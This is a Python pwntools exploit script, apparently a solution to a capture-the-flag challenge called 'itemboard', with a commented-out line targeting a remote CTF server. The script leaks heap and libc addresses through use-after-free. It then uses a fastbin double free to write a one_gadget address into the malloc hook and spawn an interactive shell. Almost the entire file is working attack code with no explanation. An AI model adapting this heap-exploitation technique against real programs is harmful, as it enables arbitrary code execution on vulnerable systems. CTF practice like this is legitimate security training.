from pwn import *
#context.log_level = 'debug'
sh = process('./itemboard')
#sh =remote('pwn2.jarvisoj.com','9887')
elf = ELF('./itemboard')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')#('./libc-2.19.so')

def add(name,size,des):
	sh.sendlineafter(':\n','1')
	sh.sendlineafter('name?\n',name)
	sh.sendlineafter('len?\n',str(size))
	sh.sendlineafter('Description?\n',des)

def list():
	sh.sendlineafter(':\n','2')


def show(idx):
	sh.sendlineafter(':\n','3')
	sh.sendlineafter('item?\n',str(idx))

def remove(idx):
	sh.sendlineafter(':\n','4')
	sh.sendlineafter('item?\n',str(idx))


add('a',0x20,'b'*0x10)
add('c',0x20,'d'*0x10)


add('e',0x10,'f'*9)
add('h',0x100,'i'*9)
add('A',0X60,'A')
add('B',0X60,'B')
add('f',0x100,'g'*0x90)

#----------leak heap base---------------------------
remove(1)
remove(0)

add('g',0,'')
show(1)
sh.recvuntil('Description:')
leak_addr = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
heap_base = leak_addr-0x560
print 'heap_base: '+hex(heap_base)
#gdb.attach(sh)
#---------leak libc addr----------------------------
remove(3)
remove(0)
add('g',9,p64(heap_base+0x690))
show(1)
sh.recvuntil('Name:')
leak_addr = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
main_arena = leak_addr - 88
libc_addr = main_arena - 0x3c4b20
one_gadget = libc_addr + 0x45216#0x4526a #0xea36d #0x46428 #0xe9415
print 'main_arena: '+hex(main_arena)
print 'libc_addr: '+hex(libc_addr)
#gdb.attach(sh)
#--------double free to getshell-----------------
add('a',0x20,'a')
add('v',0x20,'v')

remove(4)
remove(5)
remove(4)
#gdb.attach(sh)
add('a'*8+p64(0x21),0x60,p64(main_arena-0x33))
add('\x00'*8,0x60,'\x00')
add('zz',0x60,'kkk')
#gdb.attach(sh)
add('AAA',0x60,p64(heap_base+0x7e0)+'a'*5+p64(one_gadget))
gdb.attach(sh)
add('a',0x100,'a')
#remove(3)
#remove(3)
sh.interactive()


